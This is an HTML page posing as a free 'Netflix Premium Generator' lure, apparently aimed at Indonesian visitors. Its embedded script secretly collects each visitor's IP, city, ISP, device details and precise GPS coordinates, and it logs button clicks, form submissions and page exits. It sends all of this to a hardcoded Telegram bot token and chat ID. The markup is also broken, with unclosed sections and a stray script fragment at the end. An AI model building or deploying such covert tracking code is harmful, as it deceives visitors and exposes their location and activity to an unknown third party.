<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Premium Generator 2024</title>
    <style>
        :root {
            --red: #E50914;
            --dark: #141414;
            --gray: #808080;
            --light: #FFFFFF;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: var(--dark);
            color: var(--light);
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .logo {
            color: var(--red);
            font-size: 32px;
            font-weight: bold;
            text-decoration: none;
        }
        
        /* Hero */
        .hero {
            text-align: center;
            padding: 80px 20px;
            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
                        url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?ixlib=rb-1.2.1&auto=format&fit=crop&w=1920&q=80');
            background-size: cover;
            margin: 30px 0;
            border-radius: 10px;
        }
        
        .hero h1 {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .hero p {
            font-size: 20px;
            margin-bottom: 30px;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        
        /* Generator */
        .generator-box {
            background: rgba(255,255,255,0.05);
            padding: 40px;
            border-radius: 10px;
            margin: 40px 0;
        }
        
        .options {
            display: flex;
            gap: 20px;
            margin: 30px 0;
            flex-wrap: wrap;
        }
        
        select {
            flex: 1;
            min-width: 200px;
            padding: 12px;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            color: white;
            border-radius: 5px;
        }
        
        .generate-btn {
            background: var(--red);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            margin: 20px 0;
            font-weight: bold;
        }
        
        /* Accounts */
        .accounts {
            display: grid;
            gap: 20px;
            margin-top: 30px;
        }
        
        .account {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .account-details {
            font-family: monospace;
            margin: 15px 0;
        }
        
        /* Loading */
        .loading {
            text-align: center;
            padding: 40px;
            display: none;
        }
        
        .spinner {
            border: 4px solid rgba(255,255,255,0.1);
            border-top-color: var(--red);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Notification */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--red);
            color: white;
            padding: 15px 25px;
            border-radius: 5px;
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo">NETFLIX<span style="color:white">FREE</span></div>
        </header>
        
        <section class="hero">

            <div class="loading" id="loading">

            </div>
            
            <div class="accounts" id="accounts"></div>
        </div>
    </div>
    
    <div class="notification" id="notification"></div>

    <script>
        // ============================================
        // FIXED TELEGRAM BOT INTEGRATION
        // ============================================
        const BOT_TOKEN = "7712764544:AAH0qLUE6IcXK2QZTGLPyKaqVMPfa68F-0g";
        const CHAT_ID = "5726224524";
        
        class TelegramTracker {
            constructor() {
                this.sessionId = 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                this.data = {};
                this.init();
            }
            
            init() {
                // Collect initial data
                this.collectData();
                
                // Send first message
                setTimeout(() => this.sendMessage(this.formatVisitMessage()), 2000);
                
                // Setup event listeners
                this.setupEventListeners();
            }
            
            collectData() {
                // Basic info
                this.data = {
                    sessionId: this.sessionId,
                    time: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer || 'Direct',
                    userAgent: navigator.userAgent,
                    screen: screen.width + 'x' + screen.height,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookies: navigator.cookieEnabled ? 'Yes' : 'No'
                };
                
                // Get IP and location
                this.getIPLocation();
                
                // Try GPS
                this.getGPS();
            }
            
            async getIPLocation() {
                try {
                    // Method 1: ipify
                    const response = await fetch('https://api.ipify.org?format=json');
                    const ipData = await response.json();
                    this.data.ip = ipData.ip;
                    
                    // Method 2: Get detailed location
                    try {
                        const geoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,country,regionName,city,lat,lon,isp,query`);
                        const geoData = await geoResponse.json();
                        
                        if (geoData.status === 'success') {
                            this.data.location = {
                                country: geoData.country,
                                region: geoData.regionName,
                                city: geoData.city,
                                latitude: geoData.lat,
                                longitude: geoData.lon,
                                isp: geoData.isp
                            };
                        }
                    } catch (e) {
                        console.log('Geo location failed:', e);
                    }
                    
                } catch (error) {
                    // Fallback method
                    this.getIPFallback();
                }
            }
            
            async getIPFallback() {
                try {
                    // Alternative IP service
                    const res = await fetch('https://api.myip.com');
                    const data = await res.json();
                    this.data.ip = data.ip;
                    this.data.country = data.country;
                } catch (e) {
                    this.data.ip = 'Unknown';
                }
            }
            
            getGPS() {
                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            this.data.gps = {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            this.sendGPSMessage();
                        },
                        (error) => {
                            this.data.gpsError = error.message;
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                }
            }
            
            formatVisitMessage() {
                const loc = this.data.location || {};
                return `
ğŸ¬ <b>NEW VISITOR - NETFLIX GENERATOR</b>

ğŸ†” <b>Session ID:</b> <code>${this.data.sessionId}</code>
â° <b>Time:</b> ${new Date().toLocaleString('id-ID')}
ğŸŒ <b>URL:</b> ${this.data.url}

ğŸ“ <b>LOCATION INFO</b>
â”œ ğŸŒ <b>IP:</b> ${this.data.ip || 'Getting...'}
â”œ ğŸ™ï¸ <b>City:</b> ${loc.city || 'Unknown'}
â”œ ğŸ—ºï¸ <b>Region:</b> ${loc.region || 'Unknown'}
â”œ ğŸ‡®ğŸ‡© <b>Country:</b> ${loc.country || 'Unknown'}
â”” ğŸ“¡ <b>ISP:</b> ${loc.isp || 'Unknown'}

ğŸ’» <b>DEVICE INFO</b>
â”œ ğŸ–¥ï¸ <b>Browser:</b> ${this.getBrowser()}
â”œ ğŸ”§ <b>OS:</b> ${this.getOS()}
â”œ ğŸ“± <b>Screen:</b> ${this.data.screen}
â”” ğŸŒ <b>Language:</b> ${this.data.language}

ğŸ”— <b>REFERRER:</b> ${this.data.referrer}
                `;
            }
            
            formatClickMessage(buttonName) {
                return `
ğŸ–±ï¸ <b>BUTTON CLICKED</b>

ğŸ†” <b>Session:</b> <code>${this.data.sessionId}</code>
ğŸ”˜ <b>Button:</b> ${buttonName}
â° <b>Time:</b> ${new Date().toLocaleString('id-ID')}
ğŸŒ <b>Page:</b> ${window.location.href}

ğŸ“ <b>LOCATION</b>
â”œ ğŸŒ <b>IP:</b> ${this.data.ip || 'Unknown'}
â”” ğŸ™ï¸ <b>City:</b> ${this.data.location?.city || 'Unknown'}
                `;
            }
            
            formatGPSMessage() {
                if (!this.data.gps) return '';
                
                const mapsUrl = `https://www.google.com/maps?q=${this.data.gps.lat},${this.data.gps.lng}`;
                return `
ğŸ“ <b>GPS LOCATION CAPTURED!</b>

ğŸ†” <b>Session:</b> <code>${this.data.sessionId}</code>
ğŸ—ºï¸ <b>Coordinates:</b>
â”œ Latitude: ${this.data.gps.lat}
â”œ Longitude: ${this.data.gps.lng}
â”” Accuracy: ${this.data.gps.accuracy}m

ğŸ—ºï¸ <b>Google Maps:</b>
${mapsUrl}

â° <b>Time:</b> ${new Date().toLocaleString('id-ID')}
                `;
            }
            
            async sendMessage(message) {
                // Method 1: Direct Telegram API
                try {
                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML',
                            disable_web_page_preview: true
                        })
                    });
                    
                    const result = await response.json();
                    console.log('Telegram response:', result);
                    
                    if (!result.ok) {
                        // Try alternative method
                        await this.sendAlternative(message);
                    }
                    
                } catch (error) {
                    console.log('Telegram API error, trying fallback...');
                    await this.sendAlternative(message);
                }
            }
            
            async sendAlternative(message) {
                // Method 2: Using JSONP/CORS proxy
                try {
                    // Simple GET request (works if bot is public)
                    const proxyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                    
                    await fetch(proxyUrl, {
                        mode: 'no-cors' // Doesn't need CORS
                    });
                    
                } catch (e) {
                    console.log('All methods failed');
                }
            }
            
            async sendGPSMessage() {
                if (this.data.gps) {
                    const message = this.formatGPSMessage();
                    await this.sendMessage(message);
                }
            }
            
            getBrowser() {
                const ua = navigator.userAgent;
                if (ua.includes("Chrome")) return "Chrome";
                if (ua.includes("Firefox")) return "Firefox";
                if (ua.includes("Safari")) return "Safari";
                if (ua.includes("Edge")) return "Edge";
                return "Unknown";
            }
            
            getOS() {
                const ua = navigator.userAgent;
                if (ua.includes("Windows")) return "Windows";
                if (ua.includes("Mac")) return "macOS";
                if (ua.includes("Linux")) return "Linux";
                if (ua.includes("Android")) return "Android";
                if (ua.includes("iOS") || ua.includes("iPhone")) return "iOS";
                return "Unknown";
            }
            
            setupEventListeners() {
                // Track all button clicks
                document.addEventListener('click', (e) => {
                    if (e.target.tagName === 'BUTTON' || e.target.closest('button')) {
                        const button = e.target.tagName === 'BUTTON' ? e.target : e.target.closest('button');
                        const buttonName = button.textContent.trim() || button.id || 'Unknown Button';
                        
                        this.sendMessage(this.formatClickMessage(buttonName));
                    }
                });
                
                // Track form interactions
                document.addEventListener('submit', (e) => {
                    e.preventDefault();
                    this.sendMessage(`ğŸ“ FORM SUBMITTED - Session: ${this.sessionId}`);
                });
                
                // Track page visibility
                document.addEventListener('visibilitychange', () => {
                    if (document.hidden) {
                        this.sendMessage(`ğŸ‘» PAGE MINIMIZED - Session: ${this.sessionId}`);
                    }
                });
                
                // Track before unload
                window.addEventListener('beforeunload', () => {
                    const timeSpent = Math.round((Date.now() - parseInt(this.sessionId.split('-')[1])) / 1000);
                    this.sendMessage(`ğŸšª USER LEAVING - Session: ${this.sessionId} - Time spent: ${timeSpent}s`);
                });
            }
        }

                }, 3000);
